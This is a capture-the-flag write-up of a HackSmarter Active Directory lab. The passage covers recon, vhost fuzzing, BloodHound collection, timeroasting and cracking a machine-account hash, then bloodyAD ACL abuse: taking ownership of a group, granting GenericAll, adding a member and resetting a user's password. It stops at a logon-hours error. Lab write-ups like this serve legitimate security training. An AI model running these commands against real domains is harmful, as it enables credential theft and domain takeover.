---
title: HSM Defense
date: 2026-09-26
excerpt: HackSmarter - Hard
cover: ../uploads/cover_hsmdefense.jpg
tags: Timeroasting, Targeted Kerberoasting, Resource-Based Constrained Delegation (RBCD), DCSync
---

Welcome back to another writeup! In this walkthrough, I'll be demonstrating how I successfully compromised the **HSM Defense Lab** from **HackSmarter**, an **Active Directory Hard**-rated challenge designed to test enumeration, privilege escalation, lateral movement, and domain compromise skills.

Throughout this writeup, we'll break down each stage of the attack chain, from initial access and foothold establishment to privilege escalation and ultimately achieving full control over the Active Directory environment. Rather than focusing solely on commands, I'll also explain the thought process, methodology, and key concepts behind each step — what each flag does, why a given technique applies here, and how the output of one command shapes the decision for the next one.

Let's dive in and see how the HSM Defense Lab was compromised.

### Phase 1: Reconnaissance

Every engagement starts the same way: find out what's actually reachable on the target before touching anything else. We kick off with an aggressive `Nmap` scan against the box to fingerprint open ports, running services, and any obvious clues about the environment.

`-A` enables OS detection, version detection, script scanning, and traceroute all at once, and `-T5` pushes the timing template to its most aggressive setting so the scan finishes quickly — useful on a lab network where we don't need to worry about tripping IDS/IPS.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nmap -A -T5 10.1.245.74
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-22 22:55 EDT
Warning: 10.1.245.74 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.1.245.74
Host is up (0.23s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Office Careers | HSM Defense
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-23 22:26:02Z)
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: OK NAMESPACE RIGHTS=texkA0001 QUOTA ACL CAPABILITY IMAP4rev1 completed IDLE IMAP4 SORT CHILDREN
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hsm-defense.local
| Not valid before: 2026-08-31T17:16:05
|_Not valid after:  2027-03-02T17:16:05
|_ssl-date: 2026-09-23T22:26:38+00:00; +19h30m34s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|2012|2016|2022|7|2008|8.1 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows Server 2019 (93%), Microsoft Windows 10 1909 - 2004 (90%), Windows Server 2019 (90%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows 10 1909 (87%), Microsoft Windows Server 2012 Data Center (87%), Microsoft Windows Server 2016 (87%), Microsoft Windows Server 2022 (86%), Microsoft Windows 10 1903 - 21H1 (86%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 19h30m33s, deviation: 0s, median: 19h30m32s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-23T22:26:26
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   242.93 ms 10.200.0.1
2   ...
3   235.69 ms 10.1.245.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.58 seconds
```

**Reading the results:** this is unmistakably a Windows **Active Directory Domain Controller**, and a fairly "loud" one at that — a lot of ports are exposed:

* **Port 25/587 (SMTP)** and **110/143 (POP3/IMAP)** are all running `hMailServer`, meaning this box also doubles as a mail server. That's a strong hint that phishing (sending mail *to* the domain) might be part of the intended path later on.
* **Port 53 (DNS)** is `Simple DNS Plus`, the DNS service Active Directory relies on for name resolution.
* **Port 80 (HTTP)** is `Microsoft IIS 10.0`, hosting a site titled **"Office Careers | HSM Defense"** — a corporate careers page, which is a classic pretext for social-engineering/phishing style attack paths (uploading a "resume", for instance).
* **Ports 88 (Kerberos), 389 (LDAP), 445 (SMB), 464 (kpasswd)** and the RPC-related ports are all textbook Domain Controller services. The LDAP banner even leaks the domain name for us: `hsm-defense.local0.` (`hsm-defense.local`) and the site name `Default-First-Site-Name`.
* **Port 3389 (RDP)** is open, and the TLS certificate on it confirms the machine's hostname: `DC.hsm-defense.local`.
* **Port 5985 (WinRM/HTTPAPI)** is open too, meaning once we have valid credentials we have at least two remote-management paths available (RDP and WinRM).

Also worth flagging: the host script results show `Message signing enabled and required` on SMB. That tells us straight away that classic SMB relay attacks against this specific host won't work — signing is enforced. There's also a large clock skew (`~19h30m`) between our attacker box and the DC, which is a detail we'll need to actively fix later, because Kerberos is extremely picky about clock drift (by default it rejects tickets if the time difference exceeds 5 minutes).

With the domain name and hostname now known, the natural next step is to see what an initial set of credentials can do against the box. We were handed a starting credential pair for this lab (`kelly.johnson:Lordofwar`), so let's validate it and, while we're at it, use `nxc`'s (NetExec) hosts-file generator to save ourselves some typing.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb 10.1.245.74 -u kelly.johnson -p 'Lordofwar' --generate-hosts-file host
SMB         10.1.245.74     445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)                                                                    
SMB         10.1.245.74     445    DC               [-] hsm-defense.local\kelly.johnson:Lordofwar STATUS_NOT_SUPPORTED


┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ cat host                    
10.1.245.74     DC.hsm-defense.local hsm-defense.local DC
```

The authentication attempt itself returns `STATUS_NOT_SUPPORTED` rather than a normal success/failure. That specific status is a strong signal that **NTLM authentication is disabled** on this domain and only **Kerberos** is accepted — NetExec's `smb` module defaults to NTLM under the hood, so it can't even complete the handshake. This is an important environmental detail to carry forward: from here on, essentially every tool we use against this domain needs to be told to use Kerberos (`-k` in NetExec/Impacket, `--use-kcache`, exported `KRB5CCNAME` variables, etc.) instead of NTLM.

The `--generate-hosts-file host` flag is handy here regardless of the auth result — it writes a ready-to-use `/etc/hosts` line based on the SMB computer name it discovered:

```
#/etc/hosts

10.1.245.74     DC.hsm-defense.local hsm-defense.local DC
```

We drop that same line into our real `/etc/hosts` so that every subsequent tool that resolves `DC.hsm-defense.local` or `hsm-defense.local` — which Kerberos absolutely requires, since Kerberos is name-based rather than IP-based — points at the right place.

The screenshot below is the "Office Careers | HSM Defense" site that Nmap flagged on port 80. It's a static corporate-careers page, and since the initial nmap sweep didn't show any other obvious web application, this becomes a candidate surface to dig into (and, as the SMTP services hinted earlier, a possible attack vector once we start thinking about phishing "job applications" back to the company).

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVx8VYYSwIw4XSpLByLgA%252FScreenshot%2520%283449%29.png%3Falt%3Dmedia%26token%3D489ed587-7b69-400c-b356-c0587c876371\&width=768\&dpr=3\&quality=100\&sign=43ce0d0b1703e0e512e9603c61bd425c\&sv=3)

Since there's only one vhost showing on port 80 so far, it's worth checking whether IIS is quietly hosting other virtual hosts on the same IP that just aren't advertised anywhere. A `Host:`-header fuzzing sweep with `ffuf` against `hsm-defense.local` is the standard way to smoke those out: we swap in candidate subdomain names as the `Host` header and see which ones IIS actually answers differently for, using a large subdomain wordlist from SecLists.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ ffuf -H "Host: FUZZ.hsm-defense.local" -u http://hsm-defense.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hsm-defense.local
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.hsm-defense.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

support                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 260ms]
```

One hit stands out immediately: **`support`**, responding with a `401 Unauthorized` rather than blending in with the noise. A `401` (as opposed to a `404`) confirms the vhost genuinely exists and is guarding something behind authentication — almost certainly a helpdesk/ticketing portal, given the name and the "careers" theme of the main site (HR-adjacent support desks are common in these kinds of labs). We add it to our hosts file the same way as before:

```
#/etc/hosts

10.1.245.74     DC.hsm-defense.local hsm-defense.local DC support.hsm-defense.local
```

The screenshot below shows what greets us at `support.hsm-defense.local` — a Basic-Auth-style login prompt/portal, consistent with the `401` ffuf reported. This is very likely tied into Active Directory itself (IIS on a DC commonly wires up Windows/Integrated Authentication for internal portals), so our existing domain credentials are worth trying here before doing anything else.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2CNOzvgrM2JtnoVw6JY0%252FScreenshot%2520%283450%29.png%3Falt%3Dmedia%26token%3D6135017c-0af6-4116-9897-64d4c58d3429\&width=768\&dpr=3\&quality=100\&sign=40074f4ea847d04e03ab7d4b3220052c\&sv=3)

As a reminder, this is the starting credential pair the lab hands us before any exploitation begins:

```
User: kelly.johnson
Password: Lordofwar
```

Now let's try to login using this credential on the support portal we just discovered.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FR78jjBYO3rBkro1RTQvt%252FScreenshot%2520%283451%29.png%3Falt%3Dmedia%26token%3Dbb11a513-66f3-4fd7-9821-b0f2ffcd9ffe\&width=768\&dpr=3\&quality=100\&sign=590788249b039dd40914a1e40729f375\&sv=3)

The credentials are accepted, and we land inside what looks like an internal helpdesk/ticketing application.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVEFvdMtj8RRo9qxdhMc1%252FScreenshot%2520%283455%29.png%3Falt%3Dmedia%26token%3D20425e76-b580-4644-995a-cc9674d69d8d\&width=768\&dpr=3\&quality=100\&sign=05be66c7c80e15e76dd97898986aae06\&sv=3)

Browsing around the portal, tickets and other internal records are visible — exactly the kind of place where employees leave breadcrumbs about internal infrastructure, temporary passwords, or ongoing IT issues. We'll want to come back and comb through ticket contents shortly, but first, since we now have a **confirmed-valid**, low-privileged domain credential, the priority is to point a proper Active Directory enumeration tool at the domain and build a full picture of users, groups, computers, and permissions before spending more time clicking through the web portal.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJ9GhBccny5XhGRTMPwFI%252FScreenshot%2520%283453%29.png%3Falt%3Dmedia%26token%3D592ed31c-fcfc-4393-8edf-9a84e7261770\&width=768\&dpr=3\&quality=100\&sign=0bee391f8e64ec88d9840427dd29db90\&sv=3)

### Phase 2: Active Directory Enumeration

`kelly.johnson`'s credentials are valid on the domain (LDAP bind succeeded even though the earlier NTLM-based SMB check didn't), so this is the point to pull a full BloodHound-compatible dataset. `rusthound-ce` is used here instead of the classic Python BloodHound ingestor — it's a faster, Rust-based collector that talks LDAP directly and produces the same BloodHound-CE-compatible ZIP output.

Breaking down the flags:

* `-d hsm-defense.local` — target domain.
* `-u '...' -p '...'` — the credentials we just validated.
* `-f DC.hsm-defense.local` — the domain controller to bind against.
* `-n 10.1.245.74` — the DC's IP, used for the DNS/name-service side of collection.
* `-c All` — collect every available data type (sessions, ACLs, GPOs, trusts, etc.), not just the default subset.
* `-z` — output the results as a compressed `.zip` archive, ready to drag straight into the BloodHound GUI.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ rusthound-ce -d hsm-defense.local -u 'kelly.johnson@hsm-defense.local' -p 'Lordofwar' -f DC.hsm-defense.local -n 10.1.245.74 -c All -z
---------------------------------------------------
Initializing RustHound-CE at 23:00:38 on 09/22/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-23T03:00:38Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-23T03:00:38Z INFO  rusthound_ce] Collection method: All
[2026-09-23T03:00:38Z INFO  rusthound_ce::transport::ldap] Connected to HSM-DEFENSE.LOCAL Active Directory!
[2026-09-23T03:00:39Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-23T03:00:42Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hsm-defense,DC=local
[2026-09-23T03:00:42Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-23T03:00:43Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=hsm-defense,DC=local
[2026-09-23T03:00:43Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-23T03:00:43Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hsm-defense,DC=local
[2026-09-23T03:00:43Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-23T03:00:44Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hsm-defense,DC=local
[2026-09-23T03:00:44Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-23T03:00:46Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=hsm-defense,DC=local
[2026-09-23T03:00:46Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-09-23T03:00:46Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-23T03:00:46Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-23T03:00:46Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-23T03:00:46Z INFO  rusthound_ce::modules::sessions] [sessions] 1 active target(s) after expiry/enabled filter
[2026-09-23T03:00:47Z ERROR rusthound_ce::transport::smb] [DC.HSM-DEFENSE.LOCAL] SMB auth failed for hsm-defense.local\kelly.johnson: SMB2 status 0xc00000bb for command 0x0001
[2026-09-23T03:00:47Z WARN  rusthound_ce::modules::sessions] DC.HSM-DEFENSE.LOCAL: auth: SMB2 status 0xc00000bb for command 0x0001
[2026-09-23T03:00:47Z INFO  rusthound_ce::modules::sessions] [sessions] 0 session(s) enumerated in total across 1 host(s)
[2026-09-23T03:00:48Z ERROR rusthound_ce::transport::smb] [DC.hsm-defense.local] SMB auth failed for hsm-defense.local\kelly.johnson: SMB2 status 0xc00000bb for command 0x0001
[2026-09-23T03:00:48Z WARN  rusthound_ce::modules] [gpo] SYSVOL collection failed: auth: SMB2 status 0xc00000bb for command 0x0001
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 28 users parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 67 groups parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 3 computers parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 5 ous parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-09-23T03:00:48Z INFO  rusthound_ce::json::maker::common] .//20260922230048_hsm-defense-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 23:00:48 on 09/22/26! Happy Graphing!
```

A couple of details in that output are worth calling out. The tool successfully authenticates over **LDAP** and pulls back the full object list — **28 users, 67 groups, 3 computers, 5 OUs, 1 domain, 2 GPOs, 73 containers** — which is a decent-sized environment for a "lab" domain and suggests there's a real attack path built into the OU/group structure rather than a single obvious misconfiguration.

Notice, though, that the **SMB-based session and SYSVOL collection steps fail** with `SMB2 status 0xc00000bb` (`STATUS_NOT_SUPPORTED`) — the exact same status code we saw earlier when testing SMB directly. This reconfirms that NTLM is disabled domain-wide; LDAP happily accepts our plaintext bind, but anything trying to negotiate SMB via NTLM under the hood gets rejected. It's not a fatal problem (we still got the LDAP-sourced data, which is most of what BloodHound needs for ACL/group analysis), it's just a gap in *session* data (i.e., we don't yet know who's logged in where).

With the collection archive in hand, we load it into BloodHound and start graphing. The screenshots below show that analysis phase.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXQnCiHYQ1mhcVI3VXvfB%252FScreenshot%2520%283469%29.png%3Falt%3Dmedia%26token%3D812db09d-c9ad-4d6a-865d-a5e5219935a3\&width=768\&dpr=3\&quality=100\&sign=ec0a361c54fd1136ae7283b6bac62be1\&sv=3)

`Kelly Johnson` is a member of `IT-Ticket-Handlers` and `Domain Users`. Through Domain Users she inherits the usual Authenticated Users and Everyone / Pre-Windows 2000 / Users memberships. Membership in the `IT-Ticket-Handlers` group suggests this account is used for help-desk or ticketing system access and may hold related privileges.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fn90yDCbaDRxkykhJKbRH%252FScreenshot%2520%283470%29.png%3Falt%3Dmedia%26token%3D5dce69bc-b803-4042-ab95-2a6169162b0c\&width=768\&dpr=3\&quality=100\&sign=1b9a753f1bba2c805608dbbc2daa9943\&sv=3)

The built-in `Administrator` account is a member of the `Domain Admins` group. Both objects are marked as high-value. Compromising the `Administrator` account immediately yields Domain Admin privileges, representing one of the most direct paths to full domain control.

While the BloodHound graph gives us the "shape" of the domain (groups, ACLs, delegation edges), it doesn't tell us everything — some of the juiciest details in a lab like this live in plain internal documentation, like the helpdesk tickets we saw a moment ago on the `support` portal. We recall the ticket `2417` from that portal and attempt to gain access to the `HELPDESK01$` machine account using the **Timeroasting** attack it hints at.

**What is Timeroasting?** It's a technique (from the same research that gave us Kerberoasting/AS-REP-roasting terminology) that abuses Windows' NTP implementation. Domain-joined *computer* accounts periodically sync their clock with the DC over NTP, authenticating that request using a **MAC (Message Authentication Code) built from the computer account's password hash**. Critically, this exchange requires **no authentication at all** to trigger — any unauthenticated client can query the DC's NTP-over-Kerberos service on behalf of *any* RID and receive back a MAC that's effectively "the computer account's NT hash, used as an HMAC key over a known/predictable NTP payload." That MAC can then be extracted and cracked completely offline, exactly like a Kerberoast hash, giving us a shot at recovering a **cleartext password for a machine account** — no domain credentials needed for this particular attack.

Because this attack lives inside the NTP/Kerberos time exchange, our local clock needs to be within Kerberos' tolerance of the DC's clock, or the whole exchange will be rejected before we even get to the interesting part. Recall the earlier Nmap output flagged roughly 19.5 hours of clock skew — so the very first step is to force our attacking machine's clock to match the DC's:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ sudo ntpdate -u DC.hsm-defense.local
[sudo] password for kuroshiro: 
2026-09-23 19:02:55.012953 (-0400) +70233.539565 +/- 0.115069 DC.hsm-defense.local 10.1.245.74 s1 no-leap
CLOCK: time stepped by 70233.539565
```

`ntpdate -u DC.hsm-defense.local` queries the DC's NTP service and immediately steps our local clock forward to match it (`-u` uses an unprivileged/random source port, which plays nicer with some NTP server configurations). With clocks now in sync, we run NetExec's dedicated Timeroasting module:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb DC.hsm-defense.local -u kelly.johnson -p 'Lordofwar' -k -M timeroast
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar 
TIMEROAST   DC.hsm-defense.local 445    DC               [*] Starting Timeroasting...
TIMEROAST   DC.hsm-defense.local 445    DC               1000:$sntp-ms$21a2558a0d97a6ccf105bdfe3908cdf7$1c0111e900000000000a06c34c4f434cee5ed05b68e4359fe1b8428bffbfcd0aee5ed946c4cb9163ee5ed946c4cbac3b
TIMEROAST   DC.hsm-defense.local 445    DC               1105:$sntp-ms$2713e9733a076e351faa935ab4624465$1c0111e900000000000a06c44c4f434cee5ed05b6b03bd23e1b8428bffbfcd0aee5ed94782d25827ee5ed94782d2b61a                                        
TIMEROAST   DC.hsm-defense.local 445    DC               1122:$sntp-ms$6e31497a90a6d0dd5508c023b8416318$1c0111e900000000000a06c44c4f434cee5ed05b696ba8c5e1b8428bffbfcd0aee5ed9479d6366d7ee5ed9479d6381af
```

Breaking this command down: `-k` tells NetExec to use Kerberos rather than NTLM (required, since we already know NTLM is disabled), and `-M timeroast` loads the Timeroasting module. The module walks through a range of RIDs and returns one MAC per computer account it finds, formatted as a crackable `$sntp-ms$` hash (this is the hash format `hashcat` mode `31300` and recent `john` builds understand natively). We get back three hashes, tied to RIDs `1000`, `1105`, and `1122` — three machine accounts on the domain.

These hashes represent **machine account passwords**, which on real-world domains are long, random, and effectively uncrackable — but on lab/CTF-style boxes they're often deliberately set to something crackable, precisely so this attack path is viable. We throw all three at `hashcat` using mode `31300` (the Timeroasting/`sntp-ms` mode) against `rockyou.txt`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ hashcat --username -a0 -m31300 hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting
...
$sntp-ms$2713e9733a076e351faa935ab4624465$1c0111e900000000000a06c44c4f434cee5ed05b6b03bd23e1b8428bffbfcd0aee5ed94782d25827ee5ed94782d2b61a:Password123
```

One of the three cracks almost instantly: the machine account behind RID `1105` has the password **`Password123`**. Since our earlier BloodHound collection gave us the full list of computer objects and their RIDs, we can match RID `1105` back to a specific machine — in this case, **`HELPDESK01$`**. With a cracked machine-account password in hand, we validate it and, since we're on a Kerberos-only domain, immediately enumerate shares with `-k`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb DC.hsm-defense.local -u 'HELPDESK01$' -p 'Password123' -k --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\HELPDESK01$:Password123 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share 
```

It authenticates cleanly and confirms the account is valid — `HELPDESK01$` is now effectively "ours." Machine accounts aren't just noise in Active Directory; they're full-fledged security principals that can hold group memberships and explicit ACL rights just like a user account, and the BloodHound data we already collected is the natural place to check what `HELPDESK01$` can actually *do*. In this case, `HELPDESK01$` turns out to have rights over a group called **`servicedesk`**, so we chain a series of `bloodyAD` commands to escalate through it.

`bloodyAD` is a Python AD-privilege-abuse toolkit that speaks LDAP and understands Kerberos auth (`-k`) out of the box, which makes it a natural fit here. The first move is to seize **ownership** of the `servicedesk` group object:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' set owner 'servicedesk' 'HELPDESK01$'
[+] Old owner S-1-5-21-1508256018-1502282808-1859300581-512 is now replaced by HELPDESK01$ on servicedesk
```

In Active Directory, the **owner** of an object always implicitly has the right to modify that object's DACL (Discretionary Access Control List) — even if the current DACL doesn't explicitly grant them anything. So by making `HELPDESK01$` the new owner of `servicedesk`, we've effectively guaranteed ourselves the ability to grant `HELPDESK01$` any permission we like over that group next, regardless of what the original ACL said. We do exactly that:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' add genericAll 'servicedesk' 'HELPDESK01$'
[+] HELPDESK01$ has now GenericAll on servicedesk
```

`add genericAll` writes a new ACE onto `servicedesk`'s DACL granting `HELPDESK01$` **`GenericAll`** — full control — over the group object. With full control over the group, adding ourselves as a member is trivial:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' add groupMember 'servicedesk' 'HELPDESK01$' 
[+] HELPDESK01$ added to servicedesk
```

`HELPDESK01$` is now a member of `servicedesk`. Group membership in AD isn't just cosmetic — any ACL entry granted to a group applies to every member of it, so whatever rights `servicedesk` holds elsewhere in the domain, `HELPDESK01$` inherits them the moment it joins. As it turns out, `servicedesk` members can reset the password of the user `jason.caldwell`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' set password jason.caldwell 'Password123!'  
[+] Password changed successfully!
```

The password reset reports success, but trying to actually use the new credential immediately hits a wall:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb -k DC.hsm-defense.local -u 'jason.caldwell' -p 'Password123!'         
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [-] hsm-defense.local\jason.caldwell:Password123! KDC_ERR_CLIENT_REVOKED
```

`KDC_ERR_CLIENT_REVOKED` is a very specific Kerberos pre-authentication error. Rather than meaning the account is disabled, in practice Windows returns this exact error code when a **logon-hours restriction** is in effect and the current time falls outside the hours the account is permitted to log on. In other words: our new password for `jason.caldwell` is correct, but Active Directory itself is refusing the ticket request because of a time-of-day restriction baked into the account (`logonHours` attribute). The screenshots below show this from the portal/GUI side.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2VTeaDmIdlv6KRfpDWCY%252FScreenshot%2520%283455%29.png%3Falt%3Dmedia%26token%3D1ef7ce6e-da3c-488b-8043-937c8d112e00\&width=768\&dpr=3\&quality=100\&sign=f342bab2e75a8e229cd117f9bfd3ff42\&sv=3)

